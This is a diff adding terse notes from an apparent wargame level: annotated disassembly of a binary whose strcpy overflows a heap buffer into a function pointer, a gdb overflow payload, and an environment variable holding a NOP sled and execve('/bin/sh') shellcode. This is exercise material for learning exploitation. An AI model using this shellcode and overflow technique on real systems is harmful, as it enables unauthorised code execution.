@@ -1,0 +1,56 @@
+m:
+0x08048468 <+0>:	push   ebp
+0x08048469 <+1>:	mov    ebp,esp
+0x0804846b <+3>:	sub    esp,0x18
+0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1
+0x08048475 <+13>:	call   0x8048360 <puts@plt>
+0x0804847a <+18>:	leave
+0x0804847b <+19>:	ret
+
+main:
+   0x0804847c <+0>:	push   %ebp
+   0x0804847d <+1>:	mov    %esp,%ebp
+
+   0x0804847f <+3>:	and    $0xfffffff0,%esp
+
+   0x08048482 <+6>:	sub    $0x20,%esp ; 32
+   0x08048485 <+9>:	movl   $0x40,(%esp)
+   0x0804848c <+16>:	call   0x8048350 <malloc@plt> ; malloc(64);
+   0x08048491 <+21>:	mov    %eax,0x1c(%esp); on stoque a esp + 0x1c
+   0x08048495 <+25>:	movl   $0x4,(%esp)
+   0x0804849c <+32>:	call   0x8048350 <malloc@plt> malloc(4);
+   0x080484a1 <+37>:	mov    %eax,0x18(%esp) ; on stoque a esp + 0x18
+
+   0x080484a5 <+41>:	mov    $0x8048468,%edx ; &m
+   0x080484aa <+46>:	mov    0x18(%esp),%eax ; malloc(4)
+   0x080484ae <+50>:	mov    %edx,(%eax) ; on met l'adresse de m dans le malloc
+   0x080484b0 <+52>:	mov    0xc(%ebp),%eax ; argv
+
+   0x080484b3 <+55>:	add    $0x4,%eax ; argv + 1
+   0x080484b6 <+58>:	mov    (%eax),%eax ; *(argv + 1)
+
+   0x080484b8 <+60>:	mov    %eax,%edx ; edx = argv[1]
+   0x080484ba <+62>:	mov    0x1c(%esp),%eax ; eax = buffer[64]
+   0x080484be <+66>:	mov    %edx,0x4(%esp)
+   0x080484c2 <+70>:	mov    %eax,(%esp)
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt> strcpy(buffer[64], argv[1])
+   0x080484ca <+78>:	mov    0x18(%esp),%eax ; eax = &m
+   0x080484ce <+82>:	mov    (%eax),%eax ; eax = m
+   0x080484d0 <+84>:	call   *%eax ; m();
+   0x080484d2 <+86>:	leave
+   0x080484d3 <+87>:	ret
+
+buffer : 0x0804A008
+ptr : 0x0804A050
+
+buffer - ptr = 72
+
+shellcode : 0xbffff047
+
+gdb /home/user/level6/level6 -ex "set args `python -c \"print 'a' * 71 + '\x47''\xf0''\xff''\xbf'"`"
+
+0xbffffe70
+
+
+export BINSH=`python -c "print '\x90' * 10000 + '\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80'"`
+'\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80'
